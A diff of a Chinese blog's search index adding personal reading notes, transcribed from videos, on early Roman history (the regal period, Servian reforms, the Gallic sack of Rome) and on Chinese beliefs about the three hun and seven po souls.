+<p>​	在这种体系之下，罗马的国家管理机构分别是勒克斯（Rex）/王、长老议事会/元老院和库里亚大会</p>
+<p>​	其中，勒克斯就是国王。</p>
+<p>​	“国之大事，在祀与戎”。罗马也不例外。</p>
+<p>​	国王掌管军政、司法、宗教大权，由选举产生，不能世袭。</p>
+<p>​	<em>库里亚大会</em>由全体氏族的成年男子参加，负责处理国家事务中的重大问题。有选举国王、宣战议和、对法案和死刑的表决权，但是没有提案的权力。</p>
+<p>​	长老议事会有权提前讨论库里亚大会的重大问题和审查库里亚大会上表决通过的国王提案，拥有否决权。</p>
+<p>​	由于其成员大多出自贵族，所以长老议事会对国家的事务决策具有很大影响力</p>
+<p>​	罗马的王政时期一般认为有<u>七个王</u>，分别是罗穆路斯、努玛、图努斯、安库斯、老塔克文、塞尔维乌斯和小塔克文。</p>
+<p>​	在前五位王的指引下，罗马城有了一定的扩张，吸纳了周围越来越多的外族人，人口也越来越多。</p>
+<p>​	这些新进外族与旧有的三百个氏族之间自然会产生矛盾。</p>
+<p>​	此时，罗马的旧治理体系不能适应社会的这种变化。所以，在第六位王<strong>塞尔努乌斯</strong>（578-534 BC）的执政时期，对罗马的军事和政治进行了一系列<em>改革</em>。</p>
+<p>​	他推行人口和财产普查，按照财产多少划分居民的等级。不同的等级有不一样的权力和义务。</p>
+<p>​	比如处于第一等级的富豪们要负责组成80个重装步兵百人队，18个骑兵百人队，武器自备；而 处于不入流最低等级的无产者们（第六级）只需要组成1个轻装步兵百人队。</p>
+<p>​	在百人队的基础上，塞尔维乌斯建立了新的国家机构——百人队大会，又称<em>森都利亚大会</em>，负责处理宣战、选举、审判重大案件等重要事务。</p>
+<p>​	可以发现，森都利亚大会与库里亚大会的权力重叠。</p>
+<p>​	实际上，在改革之后，库里亚大会曾经的政治地位被森都利亚大会逐渐取代。</p>
+<p>​	区别是，森都利亚大会表决时，每个百人队只有一票。其中，第一等级的富有者，合计98票，而后五个等级全加起来也才95票。</p>
+<p>​	也就是说，改革后的罗马权力从库里亚大会的旧氏族人民参政制度转变为富有者统治、有产者参政的制度，而无产者被剥夺了参政权。</p>
+<p>​	另外，塞尔维乌斯还将罗马城划分为四个区。</p>
+<p>​	凡征兵、税收等事务都不再以旧有的三个部族为依据，而是以四个区为准。</p>
+<p>​	塞尔维乌斯改革打破了旧氏族血缘社会时期贵族与平民的界限。因为此时富有的平民即使没有显赫的家世，也可以参政议政。</p>
+<p>​	他建立了<u>以财产为划分标准的阶级关系</u>。这是<u>罗马从氏族社会向国家转变的关键步骤</u>。</p>
+<p>​	因此，<em>塞尔维乌斯改革是罗马国家形成的标志</em>。</p>
+<p>​	公元前535年，罗马王政时代的第七位国王<strong>小塔克文</strong>登基，他是第五位王老塔克文的儿子，据说他是靠暗杀塞尔维乌斯而夺取王位的。执政期间独断专行、厉行暴政。</p>
+<p>​	公元前510年，国王塔克文在外征战，塔克文派他的儿子<strong>塞斯图斯</strong>前往科拉提亚。在科拉提亚，塞斯图斯受到了另一位王氏宗亲<strong>克拉第努斯</strong>的热情接待。</p>
+<p>​	克拉第努斯有一个以忠贞贤惠而闻名的妻子，名叫<strong>鲁克丽丝</strong>。</p>
+<p>​	一天，塞斯图斯和克拉第努斯在军营里聚餐吃饭。他们比谁的妻子更好、更贤惠，两人谁都不服谁。</p>
+<p>​	夜里两个前往各自妻子的营帐，只有鲁克丽丝在勤劳地织布。夜里，当众人都回到营地后，塞斯图斯见色起意又溜了回来，并偷偷潜入鲁克丽丝的卧室。</p>
+<p>​	第二天，鲁克丽丝穿了一身黑，来到父亲和丈夫面前跪求他们原谅，她一五一十的把昨晚被迫的事情描述了一遍。她对众人说，一定要报仇，虽然对方是当今的王子，也绝不能草草了事。</p>
+<p>​	在场的人议论纷纷，就在大家讨论这件事怎么办的时候，鲁克丽丝不甘受辱，她突然拔出匕首，自杀以正清白。</p>
+<p>​	克拉第努斯看到倒在血泊中的妻子，悲痛欲绝。众人一边对鲁克丽丝心生怜悯，一边对当权者的无道充满愤恨。</p>
+<p>​	这时，克拉第努斯的朋友<strong>布鲁图斯</strong>捡起了那把带血的匕首，对神发誓，暴君不除，绝不生还。</p>
+<p>​	她带着鲁克丽丝的尸体，来到罗马广场上，向民众宣告着王室的暴行。他的一番演讲，将民众心中久久积压的怒火转变为反抗压迫的力量。</p>
+<p>​	他们联合起来，组建军队。公元前509年，推翻了国王塔克文的统治。</p>
+<p>​	革命者为罗马建立了一个新的政治制度——<em>共和制</em>。民众推举布鲁图斯和克拉第努斯为执政官。</p>
+<p>​	<u>历时240多年的罗马王政时代结束（753-509BC），从此开始了罗马共和国时代</u>。</p>
+<ul>
+<li>
+<p>相关阅读：莎士比亚《鲁克丽丝受辱记》</p>
+<ul>
+<li>
+<p>原文！写的真入微</p>
+</li>
+<li>
+<p><a href="https://www.diyifanwen.com/sicijianshang/mingjiaaiqingshi/221844869_7.html">莎士比亚诗选-鲁克丽丝受辱记 (diyifanwen.com)</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
+<p>当时看完这p去搜了莎士比亚写的这首诗。看完……还没看完，就觉得好长、好长啊……当然莎士比亚这个文笔也真的是山路十八弯九曲回肠的非常婉转诗意啊</p>
+]]></content>
+      <categories>
+        <category>文史哲</category>
+        <category>世界史</category>
+        <category>罗马史</category>
+      </categories>
+      <tags>
+        <tag>reading</tag>
+        <tag>世界史</tag>
+        <tag>罗马史</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【从城邦到帝国】2_北蛮入侵_罗马危机</title>
+    <url>/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%912_%E5%8C%97%E8%9B%AE%E5%85%A5%E4%BE%B5_%E7%BD%97%E9%A9%AC%E5%8D%B1%E6%9C%BA/</url>
+    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
+<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
+<h3 id="北蛮入侵-罗马危机"><a class="header-anchor" href="#北蛮入侵-罗马危机">¶</a>北蛮入侵 罗马危机</h3>
+<p>公元前509年，罗马人在布鲁图斯和克拉第努斯的带领下推翻国王，以此为起点，直到公元前27年，元老院授予<strong>屋大维</strong>“奥古都斯”称号为止的这四百八十二年间，称<u>罗马共和国</u>。</p>
+<p><u>两条主线</u></p>
+<p><em><strong>一  平民与贵族的斗争  使罗马的各项制度趋于完善</strong></em></p>
+<p><em><strong>二  大规模的对外扩张  使罗马确立地中海霸权</strong></em></p>
+<p>自从布鲁图斯和克拉第努斯推翻王政后，元老院同意从贵族中推选两名<strong>执政官</strong>，以代替原来的国王治理国家。</p>
+<p>这两人权力相等，彼此制衡，且执政官的任期只有一年，卸任后自然回归元老院，国家将再度选举新执政官（老执政官依然可能再度当选）。</p>
+<p>当国家处于战争等非常时期，为了确保权力集中，以处理国是，将由元老院推举<strong>独裁官</strong>。</p>
+<p>这个独裁官可能是执政官，也可能是其他元老中的某一位。</p>
+<p>罗马共和国为了避免独裁官权力过于膨胀，又规定独裁官只能任职六个月。如果任期将满，而国家仍处于非常时期，则由元老院再行选举，老独裁官也可能会连任。</p>
+<p>此外罗马还完善其他官制，比如<strong>保民官</strong>、<strong>市政官</strong>之类。</p>
+<p>共和之初的罗马强邻环伺，只是亚平宁半岛上众多国家或部落中的一个小国。</p>
+<p>在她的背面是意大利最强大的埃特鲁里亚人，南面是沃尔西人、萨莫奈人、希腊人等，生存环境十分恶劣。</p>
+<p>共和国最初的一百多年，罗马人就是在不断的和近邻的战斗中度过的。</p>
+<p>公元前五世纪下半叶，罗马人在与沃尔西人的较量中转入优势。与此同时，罗马人与埃特鲁里亚人之间也爆发战争。</p>
+<p>距离罗马城东北方向十二英里处有一座埃特鲁里亚人的重镇<em>维爱城</em>。早在王政时期，双方就因为水源、土地、盐、奴隶等各种原因经常打仗。</p>
+<p>公元前479年，罗马对<em>维爱战争</em>中失利；公元前430年，罗马人扳回一局；</p>
+<p>公元前405年，罗马再次进军，意图吞并维爱（Veii）。而这次出兵先后持续了10年。直到公元前396年，罗马执政官<strong>卡米卢斯</strong>（Camillus）夺取城池。</p>
+<p>经过三次<u>维爱战争</u>，罗马的<em>埃特鲁里亚之患</em>从此消失，其势力也从拉丁平原扩张到意大利北部。</p>
+<p>这场战争也是<u>罗马开始对外征服的标志</u>。</p>
+<p>罗马在被征服的城市建立殖民地，和被征服者订立盟约，并排遣自己人去监督和统治这些地方，进而形成了自治、半自治或同盟关系。</p>
+<p>公元前391年，一支<em>高卢</em>人部落（赛农人Senone）在布伦努斯的率领下从北意大利沿着亚德里亚海岸一路摧枯拉朽，十分骁勇。</p>
+<p>攻打至埃特鲁里亚的克鲁西姆城时（今：Chiusi），克鲁希姆告急，向罗马求援。</p>
+<p>罗马元老院向这支高卢人部落派遣了三个使臣，勒令停战，结果在谈判席上，双方进行了一波不太友好的交谈，两方人打了起来。</p>
+<p>期间，罗马使者还杀了一个高卢的小头目。遭受奇耻大辱的高卢人在几天后便排遣大军杀向罗马</p>
+<p>公元前390年，两军在距离罗马城北16公里外的阿里亚小河交战（Battle of the Allia）。</p>
+<p>高卢人突然兵临城下，令罗马人十分惊讶，以至于罗马军几乎没有时间搭建营地和防御工事就匆匆投入战场。</p>
+<p>为了避免被全歼，罗马军将战线拉长，并分兵排遣一支部队驻扎在军阵右侧的小山上。</p>
+<p>高卢首领布伦努斯察觉到罗马人的动向，他担心一旦两军交战，罗马的右翼会从己方军阵的后方发起袭击，届时恐于己不利，于是他直接命令手下向罗马军右翼率先发起进攻。</p>
+<p>罗马军左翼部队紧急向右军靠拢，而高卢军早已杀入军阵，拦住左翼去路，双方陷入混战。</p>
+<p>可能是因为高卢人的剑比罗马人的长，使得战斗中的罗马人全线劣势，军心大乱。渐渐的越来越多的人在恐慌之中四处逃窜，左翼撤往维爱，右翼撤往罗马。</p>
+<p>而高卢人对于这场轻而易举取得的胜利感到十分震惊。处理完战场后，他们集结军队继续向罗马城进发。</p>
+<p>此时，罗马败退的军队大多数已经逃往维爱，少部分逃到罗马，而那些逃到罗马的人认为自己力量弱小，根本不是高卢人的对手，固守城池等于必死无疑。</p>
+<p>于是，他们中的青壮年带着给养退守卡皮托尔山，只留下了少数妇孺老人（包括一些元老）在城市中。</p>
+<p>当高卢大军抵达罗马城下时，发现城门大开，无人看守，顿时就起了疑心。</p>
+<p>为了避免意外，高卢军很小心的在罗马与阿尼奥河之间扎营（今：Aniene River）。第二题，高卢人留下小队留守城门，剩下的大部队入城劫掠。他们进了城，发现街道上有一些路障，贵族的议事厅大门也是敞开的，城里异常的安静。就在他们以为这是个空城的时候，一个高卢人注意到几位衣着华丽的老者坐在不远处的走廊台阶上。他们面无表情，似乎内心毫无波澜。</p>
+<p>高卢人走上去，仔细端详这几位一反常态的老者，并好奇地伸手去摸了摸其中一位老者长长的胡子。这时，老人举起手中的象牙拐杖，敲了下那个高卢人的头。而高卢人反手一刀索了他的命，余者亦无一幸免。</p>
+<p>为了让那些逃至山中的罗马人回城救援他们的财物和亲人，高卢人放火烧城并大肆劫掠。</p>
+<p>高卢军见罗马人没能中计，主动冲山。罗马军以逸待劳，加之居高临下，拼死抵抗，化解了高卢人的数次进攻。</p>
+<p>高卢人见攻山不利，于是在山脚下布阵，将山上的罗马人全部包围。</p>
+<p>此前逃到维爱城的罗马军也重新集结起来，他们将维爱城中的埃特鲁里亚奴隶充军，加上拉丁同盟的支持，军队恢复些许元气。随后在元老院的批准下，将此前被驱逐的前执政官<strong>卡米卢斯</strong>召回并任命为<strong>独裁官</strong>。卡米卢斯带领军队向罗马进发。</p>
+<p>在卡皮托尔山下，高卢人打探到一条上山小道，于是高卢军悄悄上山意图偷袭罗马人。眼看着就要接近罗马营地时，一只**<u>大鹅</u>**突然嘎嘎大叫，罗马人惊醒，将高卢人击退。随后的日子里，双方一直僵持不下。</p>
+<p>高卢军营内出现疟疾，不少士兵倒下。高卢人派使者找罗马人谈判，但罗马指挥官得知援军正在赶来的路上，于是拒绝，但士兵挨饿。随后双方经过谈判，罗马同意支付一千磅黄金。</p>
+<p>在交付的时候，高卢人故意用一个不准的秤去称黄金，罗马人十分恼怒上前交涉。这时，高卢首领布伦努斯将剑丢到了秤的另一头。罗马人迫于形势，也只好忍着屈辱去搬更多的黄金放在秤上。</p>
+<p>就在这个添黄金的关头，维爱的援军在卡米卢斯的率领下终于赶到罗马。双方无法谈拢，只能再次开战（BC 390-BC 387），此次交战，罗马取得大胜，高卢军惨败而逃。</p>
+<p>这段故事由<strong>李维</strong>（Titus Livius）记载。其他史书还有不同记载，比如高卢人向罗马人勒索赎金之后便撤军走了。由于年代久远，历史学家对这些记载的真实性持不同观点。</p>
+]]></content>
+      <categories>
+        <category>文史哲</category>
+        <category>世界史</category>
+        <category>罗马史</category>
+      </categories>
+      <tags>
+        <tag>reading</tag>
+        <tag>世界史</tag>
+        <tag>罗马史</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【中国神话-冥界篇】1_三魂七魄</title>
+    <url>/2024/07/07/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%AD%E5%9B%BD%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D/%E5%86%A5%E7%95%8C%E7%AF%87/%5B%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D-%E5%86%A5%E7%95%8C%E7%AF%87%5D-1-%E4%B8%89%E9%AD%82%E4%B8%83%E9%AD%84/</url>
+    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
+<p>[视频地址](<a href="https://www.bilibili.com/video/BV1yA411V7ko/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3f0983ef34615b702fec513c41e55a64">[中国神话-冥界篇 合集]中国古代魂魄观念大盘点！让你理清中国人的灵魂观！_哔哩哔哩_bilibili</a>)    感觉自分乃亚文化爱好者HHH</p>
+<h3 id="冥界篇-1"><a class="header-anchor" href="#冥界篇-1">¶</a>冥界篇 1</h3>
+<ul>
+<li>
+<p>由于中国人喜欢记录历史，神话人物大部分以历史人物为雏形衍生的，例如三皇五帝就是以部落或者部落首领的名字来创作的神话。</p>
+</li>
+<li>
+<p>中华民族还有着楚国屈原记录的《九歌》神话。</p>
+<ul>
+<li>
+<p>在九歌之中，东皇太一是至高主神；</p>
+</li>
+<li>
+<p>而在《山海经》中，则以女娲、帝俊为主神；</p>
+</li>
+<li>
+<p>盘古开天的神话却要直到三国时期由徐整所著的《三五历纪》中才出现，比在战国时期的《山海经》雏形要晚了几百年。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>十几代人的时间差使得中国神话主神与诸神的关系模糊不清，再加上道教、佛教、儒家思想对于神话的梳理与编纂，中国神话的主要脉络很难梳理。</p>
+</li>
+<li></li>
+<li>
+<p>传说商朝人好鬼神，每逢有战事或国家大事，帝王都会去往祖陵或祭台由祭司进行占卜。最为主流的占卜是将龟甲打磨抛光之后，由祭司投入紫荆木点燃的火焰之中，以龟甲之上的裂痕来判断吉凶，并以吉凶来判断接下来人们该怎样行事。这里的占卜出的结果，就是上天和鬼神们所给人的答案。</p>
+</li>
+<li>
+<p>“社稷大事，唯祀与戎”</p>
+</li>
+<li>
+<p>但随着时间的流逝，这一类的占卜之术逐渐的失传，变为了其他形式。</p>
+</li>
+<li>
+<p>到了汉朝时，帝王独尊儒术，圣人孔子不说鬼神。此时，对于鬼神的解释之权落到了道家的手中。道家以老子学说，结合阴阳五行，乾坤八卦思想，再加上古人对于天地自然的观测与想象，这才衍生出了三魂七魄的观念。</p>
+</li>
+<li>
+<p>这个观念之所以能保留下来，也是因为皇权与儒家选择的结果。中国人敬拜祖先，因此还有了清明节和中元节这一类祭奠逝者的节日。</p>
+</li>
+<li>
+<p>在三魂七魄的观念未出现之前，不说鬼神的儒家一直无法解释大家到底在祭拜什么。直到三魂七魄观念的出现，才打破这一僵局。</p>
+</li>
+<li></li>
+<li></li>
+<li>
+<p>三魂，分别是天魂胎光、地魂爽灵、人魂幽精。</p>
+</li>
+<li>
+<p>传说在人没有出生之前，人魂由神明专司保管。当人体形成，人魂就会进入到肉体之中，此时，天地阴阳之精气也会形成人的魂魄，从而辅助人魂的成长。随着人本身的成长，天地人三魂也会有着同样的记忆、行为与性格。</p>
+</li>
+<li></li>
+<li>
+<p>一个传说之中的故事：明太祖朱元璋有一次被一个冒失的太监吓了一跳，于是命人将太监拖出去斩首，当时这个太监吓得面无血色。在斩首之时，人们惊讶的发现，斩首台之下竟然有一个长的和太监一模一样的人在那里看热闹。在太监被斩首的前一刻，朱元璋又下旨赦免了这个太监。也是这一吓，将太监的一个魂吓掉了，幻化出来另一个一模一样的自己并较有兴致的观看自己被斩首。</p>
+</li>
+<li>
+<p>而在人死后，天魂和地魂的精气会再度回归到天地之中。丧失本源精气的这两个魂，一个会守护在自己的尸身旁边，一个会去到子孙后代供奉的牌位之中，接受子孙的敬拜与祭祀，而人魂则会被专司灵魂的神明拘走，从而为自己生前的善果和恶行负责；依附在尸身与牌位旁的魂，会像是一个监视器一样在灵位与坟墓旁边观看子孙的言行，观察子孙是否遵纪守法，心向善而不作恶，并保佑这些子孙健康的成长</p>
+</li>
+<li>
+<p>这套说法之所以能够大面积地流行，很大原因取决于儒家接受了三魂这一设定，认为人每当清明节祭祀祖先的时候，都是在祭祀祖先肉体死亡后留下来的那个魂（此处可以指先祖的精神）</p>
+</li>
+<li>
+<p>但对于祖先的祭祀也有规矩：先祖们只能够接受自己直系血脉的祭祀。这个观点来自于古代人对血缘观念的认识。</p>
+</li>
+<li>
+<p>民间也有流传这样一个传说故事：据说一个地方的县太守手下有一个异人，这个人天生可以看到各家祖先的祭祀情况，县太守便命此人观察自家祭祀香火情况。当县太守的儿子为自家祖先上香之后，这个人却说他看到一个屠夫模样的魂进入到太守的祖庙大吃大喝，而旁边穿着官服的县太守本家的祖先，却饿的瘦骨嶙峋在家庙前徘徊。县太守于是逼问妻子，才得知当年生的是女儿，与屠夫家的女人换了孩子。</p>
+</li>
+<li>
+<p>由这个故事可见中国文化中对直系子孙的重视，因此还产生了“不孝有三，无后为大”的言论。虽然故事中由重男轻女的陈腐观念，但也可以从中看出鬼神文化对古人生活的影响。</p>
+</li>
+<li>
+<p>在<strong>道家</strong>系统中，三魂是阳之所属，相对应的七魄则是阴所在。七魄各自都有名称，分别是尸狗、伏矢、雀阴、吞贼、非毒、除秽、臭肺。七魄各自负责人们的喜、怒、哀、惧、爱、恶、欲七种主要的情绪。</p>
+</li>
+<li>
+<p>传说在平日里，都是由三魂来掌控七魄，致使七魄不敢为非作歹使人沉浸于情欲之中。但当三魂受到严重打击而衰弱之时，三魂无力掌控七魄，</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>文史哲</category>
+        <category>中国史</category>
+        <category>中国神话</category>
+        <category>冥界篇</category>
+      </categories>
+      <tags>
+        <tag>reading</tag>
+        <tag>世界史</tag>
+        <tag>中国神话</tag>
+        <tag>冥界篇</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【艺术史】来世与王权的艺术——古埃及艺术</title>
     <url>/2024/07/04/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E5%9F%83%E5%8F%8A%E5%8F%B2/%E3%80%90%E8%89%BA%E6%9C%AF%E5%8F%B2%E3%80%91%E6%9D%A5%E4%B8%96%E4%B8%8E%E7%8E%8B%E6%9D%83%E7%9A%84%E8%89%BA%E6%9C%AF%E2%80%94%E2%80%94%E5%8F%A4%E5%9F%83%E5%8F%8A%E8%89%BA%E6%9C%AF/</url>
     <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
@@ -2162,307 +2727,6 @@ select task_name, due_date from tasks limit 2, 2;
         <tag>reading</tag>
         <tag>世界史</tag>
         <tag>埃及史</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【从城邦到帝国】1_罗马起源_王政时代</title>
-    <url>/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%5B%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%5D-1-%E7%BD%97%E9%A9%AC%E8%B5%B7%E6%BA%90-%E7%8E%8B%E6%94%BF%E6%97%B6%E4%BB%A3/</url>
-    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
-<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
-<h3 id="罗马起源-王政时代"><a class="header-anchor" href="#罗马起源-王政时代">¶</a>罗马起源 王政时代</h3>
-<p>​	<em>亚平宁半岛</em>是罗马的起源之地，早在旧石器时代这里就有人类活动的迹象。随着人类族群的迁徙，居民成分也日趋复杂.</p>
-<p>​	到公元前8世纪时，这里生活着自石器时代以来就住在这儿的原住民，比如利古里亚人、撒丁人；青铜时代前后来到这儿的印欧语系部落，比如翁布里亚人、萨宾人、拉丁人，还有一些来自小亚细亚的埃特鲁里亚人，以及从爱琴海那边来殖民的希腊人，最后是从阿尔卑斯翻山越岭而来的高卢人。而罗马的先民们，只是众多上古意大利居民中的一支，拉丁族的一个小部分。</p>
-<p>​	公元前九到八世纪，一些部落迁移到帕拉丁、厄斯魁林、奎里纳尔等七个山丘定居，进而形成了数个村落。后来，几个村落逐渐联合起来，称七丘联盟。其中生活在帕拉丁山罗马村的拉丁人，成了这个联盟的核心，这就是早期的罗马王国。</p>
-<p>​	关于罗马城的建立，其实还有一个传说：</p>
-<p>​		<strong>努米托尔</strong>和<strong>阿穆利乌斯</strong>兄弟俩是特洛伊城的王子埃涅阿斯的后代，努米托尔是阿尔巴朗格的国王，阿穆利乌斯掌管国家宝库。但是，阿穆利乌斯不满现有的权力，于是他篡夺了努米托尔的王位。</p>
-<p>​		为了防止努米托尔的后代报复，阿穆利乌斯就强迫努米托尔唯一的女儿雷亚·<strong>西尔维娅</strong>去做维斯塔贞女，因为贞女是不能结婚的。但是，西尔维娅与战神马尔斯相遇后，坠入爱河，生了两个孩子，分别叫<strong>罗穆路斯</strong>和<strong>雷穆斯</strong>。</p>
-<p>​		阿穆利乌斯知道此事后十分恼怒，便把西尔维娅给活埋了，她的两个孩子也被扔到了野外。幸运的是，两个弃婴经过一头母狼的乳汁哺育而活了下来。后来，一个叫浮士德的牧羊人发现了兄弟俩并带回家抚养。</p>
-<p>​		长大后，他们向阿穆利乌斯复仇，最终帮助努米托尔夺回王位，而城中的难民、流浪者和奴隶被兄弟俩带走，其中大多数人是男性。</p>
-<p>​		他们决定一起在别处另建一座新城，但是兄弟俩因为城市选址的问题发生了争执，罗穆路斯便杀死了雷穆斯，并以自己的名字，给这座新城取名为罗马，而<u>罗穆路斯就成成为罗马的第一位王</u>。</p>
-<p>​	这一年，是公元前753年。以此为起点，罗马进入王政时代。</p>
-<p>​	早期的罗马人口结构失衡，男多女少。为了种族的延续，罗马的男人在罗穆路斯带领下，决定想办法抢隔壁村萨宾人的女人。</p>
-<p>​	他们举办了一场大宴会，不少<strong>萨宾人</strong>拖家带口来参加盛宴。</p>
-<p>​	就在大家享受美食之际，罗穆路斯突然令手下对萨宾人尤其是他们的女人下手。</p>
-<p>​	700多萨宾女人被绑到罗马，后来成为罗马人的妻子。</p>
-<p>​	萨宾人与罗马之间数次交战，各有胜负。</p>
-<p>​	就在双方又要爆发新一次的战争之际，这时，被罗马人抢走的女人们站了出来劝双方和解。因为这时候早就已经生米煮成熟饭了，大家都是亲戚了。双方首领也意识到，与其刀戈相向，不如和睦相处。于是<u>罗马人与萨宾人从此合并</u>。</p>
-<p>​	王政早期，罗马社会是一种依托血缘关系的氏族社会。包括三个部族，分别是拉丁人、埃特鲁里亚人和萨宾人。</p>
-<p>​	每个部族又包括十个胞族（Curia）又称库里亚。每个胞族又包括十个氏族（Gentes）。</p>
-<p>​	其中氏族的头领、贵族在一起议事，就形成了长老议事会，或者称<strong>元老院</strong>。</p>
-<p>​	也就是说，这三个部族、三十个胞族和三百个氏族，组成了最初的罗马公民。</p>
-<p>​	在这种体系之下，罗马的国家管理机构分别是勒克斯（Rex）/王、长老议事会/元老院和库里亚大会</p>
-<p>​	其中，勒克斯就是国王。</p>
-<p>​	“国之大事，在祀与戎”。罗马也不例外。</p>
-<p>​	国王掌管军政、司法、宗教大权，由选举产生，不能世袭。</p>
-<p>​	<em>库里亚大会</em>由全体氏族的成年男子参加，负责处理国家事务中的重大问题。有选举国王、宣战议和、对法案和死刑的表决权，但是没有提案的权力。</p>
-<p>​	长老议事会有权提前讨论库里亚大会的重大问题和审查库里亚大会上表决通过的国王提案，拥有否决权。</p>
-<p>​	由于其成员大多出自贵族，所以长老议事会对国家的事务决策具有很大影响力</p>
-<p>​	罗马的王政时期一般认为有<u>七个王</u>，分别是罗穆路斯、努玛、图努斯、安库斯、老塔克文、塞尔维乌斯和小塔克文。</p>
-<p>​	在前五位王的指引下，罗马城有了一定的扩张，吸纳了周围越来越多的外族人，人口也越来越多。</p>
-<p>​	这些新进外族与旧有的三百个氏族之间自然会产生矛盾。</p>
-<p>​	此时，罗马的旧治理体系不能适应社会的这种变化。所以，在第六位王<strong>塞尔努乌斯</strong>（578-534 BC）的执政时期，对罗马的军事和政治进行了一系列<em>改革</em>。</p>
-<p>​	他推行人口和财产普查，按照财产多少划分居民的等级。不同的等级有不一样的权力和义务。</p>
-<p>​	比如处于第一等级的富豪们要负责组成80个重装步兵百人队，18个骑兵百人队，武器自备；而 处于不入流最低等级的无产者们（第六级）只需要组成1个轻装步兵百人队。</p>
-<p>​	在百人队的基础上，塞尔维乌斯建立了新的国家机构——百人队大会，又称<em>森都利亚大会</em>，负责处理宣战、选举、审判重大案件等重要事务。</p>
-<p>​	可以发现，森都利亚大会与库里亚大会的权力重叠。</p>
-<p>​	实际上，在改革之后，库里亚大会曾经的政治地位被森都利亚大会逐渐取代。</p>
-<p>​	区别是，森都利亚大会表决时，每个百人队只有一票。其中，第一等级的富有者，合计98票，而后五个等级全加起来也才95票。</p>
-<p>​	也就是说，改革后的罗马权力从库里亚大会的旧氏族人民参政制度转变为富有者统治、有产者参政的制度，而无产者被剥夺了参政权。</p>
-<p>​	另外，塞尔维乌斯还将罗马城划分为四个区。</p>
-<p>​	凡征兵、税收等事务都不再以旧有的三个部族为依据，而是以四个区为准。</p>
-<p>​	塞尔维乌斯改革打破了旧氏族血缘社会时期贵族与平民的界限。因为此时富有的平民即使没有显赫的家世，也可以参政议政。</p>
-<p>​	他建立了<u>以财产为划分标准的阶级关系</u>。这是<u>罗马从氏族社会向国家转变的关键步骤</u>。</p>
-<p>​	因此，<em>塞尔维乌斯改革是罗马国家形成的标志</em>。</p>
-<p>​	公元前535年，罗马王政时代的第七位国王<strong>小塔克文</strong>登基，他是第五位王老塔克文的儿子，据说他是靠暗杀塞尔维乌斯而夺取王位的。执政期间独断专行、厉行暴政。</p>
-<p>​	公元前510年，国王塔克文在外征战，塔克文派他的儿子<strong>塞斯图斯</strong>前往科拉提亚。在科拉提亚，塞斯图斯受到了另一位王氏宗亲<strong>克拉第努斯</strong>的热情接待。</p>
-<p>​	克拉第努斯有一个以忠贞贤惠而闻名的妻子，名叫<strong>鲁克丽丝</strong>。</p>
-<p>​	一天，塞斯图斯和克拉第努斯在军营里聚餐吃饭。他们比谁的妻子更好、更贤惠，两人谁都不服谁。</p>
-<p>​	夜里两个前往各自妻子的营帐，只有鲁克丽丝在勤劳地织布。夜里，当众人都回到营地后，塞斯图斯见色起意又溜了回来，并偷偷潜入鲁克丽丝的卧室。</p>
-<p>​	第二天，鲁克丽丝穿了一身黑，来到父亲和丈夫面前跪求他们原谅，她一五一十的把昨晚被迫的事情描述了一遍。她对众人说，一定要报仇，虽然对方是当今的王子，也绝不能草草了事。</p>
-<p>​	在场的人议论纷纷，就在大家讨论这件事怎么办的时候，鲁克丽丝不甘受辱，她突然拔出匕首，自杀以正清白。</p>
-<p>​	克拉第努斯看到倒在血泊中的妻子，悲痛欲绝。众人一边对鲁克丽丝心生怜悯，一边对当权者的无道充满愤恨。</p>
-<p>​	这时，克拉第努斯的朋友<strong>布鲁图斯</strong>捡起了那把带血的匕首，对神发誓，暴君不除，绝不生还。</p>
-<p>​	她带着鲁克丽丝的尸体，来到罗马广场上，向民众宣告着王室的暴行。他的一番演讲，将民众心中久久积压的怒火转变为反抗压迫的力量。</p>
-<p>​	他们联合起来，组建军队。公元前509年，推翻了国王塔克文的统治。</p>
-<p>​	革命者为罗马建立了一个新的政治制度——<em>共和制</em>。民众推举布鲁图斯和克拉第努斯为执政官。</p>
